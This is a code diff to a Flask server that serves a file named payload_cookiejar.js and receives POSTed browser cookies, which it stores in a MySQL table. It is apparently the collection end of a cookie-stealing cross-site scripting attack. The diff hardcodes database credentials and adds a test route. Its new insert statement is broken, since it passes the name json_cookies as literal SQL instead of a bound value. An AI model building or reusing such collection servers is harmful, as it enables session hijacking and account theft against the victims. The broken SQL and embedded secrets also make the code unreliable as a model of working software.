@@ -10,6 +10,14 @@ import mysql.connector
 app = Flask(__name__)
 CORS(app)
 
+dbConfig = {
+	'user': 'lsuser',
+	'password': 'tic123',
+	'host': 'localhost',
+	'database': 'loginsystem',
+	'raise_on_warnings': True
+}
+
 @app.route('/', methods=['GET']) 
 def index():
     return '''
@@ -28,6 +36,19 @@ def index():
 @app.route('/cookies.js', methods=['GET'])
 def sending_cookie():
     return send_file('./payload_cookiejar.js', attachment_filename='payload_cookiejar.js')
+
+  
+@app.route('/test', methods=['GET'])
+def test_db_update():
+    conn = mysql.connector.connect(**dbConfig)
+    cursor = conn.cursor()
+    test_insert = ("insert into cookies (cookie) values ('Testing');")
+    cursor.execute(test_insert)
+    conn.commit()
+    cursor.close()
+    conn.close()
+    return ('', 204)
+
     
 @app.route('/receiveCookie',methods=['POST', 'OPTIONS'])
 def receive_cookie():
@@ -41,27 +62,12 @@ def receive_cookie():
         return response
         
     json_cookies = request.get_json()
-    print (json.dumps(request.get_json(), indent=2, ensure_ascii=False))
-    http_cookies = request.cookies.to_dict()
-
-    cookies = {}
-    for key in set(json_cookies.keys()).union(set(http_cookies.keys())):
-        if key in json_cookies and key in http_cookies:
-            if json_cookies[key] == http_cookies[key]:
-                cookies[key] = json_cookies[key]
-        else:
-            if key in json_cookies:
-                cookies[key] = json_cookies[key]
-            else:
-                cookies[key] = http_cookies[key]
     
-    conn = mysql.connector.connect(user='lsuser', password='tic123', database='loginsystem')
+    conn = mysql.connector.connect(**dbConfig)
     cursor = conn.cursor()
-    for key, value in cookies.items():
-    	insert_cookie = ("insert into cookies (cookie) values (concat(key,':',value));")
-    	cursor.execute(insert_cookie)
-    	conn.commit()
-    #test_insert = ("insert into cookies (cookie) values ('test2');")
+    insert_cookie = ("insert into cookies (cookie) values (json_cookies);")
+    cursor.execute(insert_cookie)
+    conn.commit()
     cursor.close()
     conn.close()
     
